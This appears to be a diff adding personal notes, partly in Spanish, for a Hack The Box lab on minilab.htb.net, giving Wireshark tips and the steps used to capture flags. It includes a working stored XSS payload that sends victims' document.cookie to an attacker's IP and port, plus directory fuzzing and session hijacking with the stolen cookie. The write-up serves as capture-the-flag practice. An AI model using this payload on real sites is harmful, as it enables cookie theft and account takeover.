@@ -1,0 +1,53 @@
+   ________
+  | TIPS:  |
+  |________|
+1- cuando encuentre un archivo pcap, abririrlo con wireshark
+2- nunca buscar manualmente una linea especifica en wireshark, es una perdida de tiempo.
+3- siempre filtrar por http en los archivos pcap en wireshark, si no hay nada en http buscar http2, http y si no hay nada, listar todos los filtros y probar con otros de la lista.
+4- cambiar cookies y recargar paginas
+5- buscar directorios como: 
+   - /submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com/robots.txt
+      se debe de ver asi: {"adminVisited":true,"adminVisitedTimestamp":1693856015502,"success":true}
+   - /profile?email=superadmin@htb.net
+
+
+__________________________________________________________________
+ ______________________________________
+|proceso de obtencion de flag:         |
+|______________________________________|
+1- enter to target website
+2- fill the shields as:
+   email: [not modify]
+   telephone: <script>alert(1)</script>
+   country: 
+   <style>@keyframes x{}</style><video style="animation-name:x"
+   onanimationend="window.location = 'http://10.10.15.155:8000/[our_script_name.php]?c=' 
+   + document.cookie;"></video>
+3- click on save, confirm to save, get back, click on share
+4- once we shared the xss payload, let's look to our localhost php server 
+5- use dirbuster, ffuf, wfuzz, gobuster or another fuzzer, at http://minilab.htb.net/[FUZZ]
+6- locate for something like: http://minilab.htb.net/submit-solution
+7- modify the url: http://minilab.htb.net/submit-solution?url=http://localhost
+8- create the file script.php (file with the code on this directory)
+9- modify the script.php ant change the location, set the virtual host dns
+10- start a local server in php pointing at tun0 interface ip and port 8000
+11- save and share the payload
+12- enter to http://minilab.htb.net/profile?email=julie.rogers@example.com
+13- enter to http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
+14- set the cookie and reload the vhost
+15- save, share and change the visibilty as public
+16- get the first flag and download the pcap, analyze by using wireshark, filter by "http" and get the 2nd flag
+
+
+
+
+
+
+
+
+
+
+
+
+
+
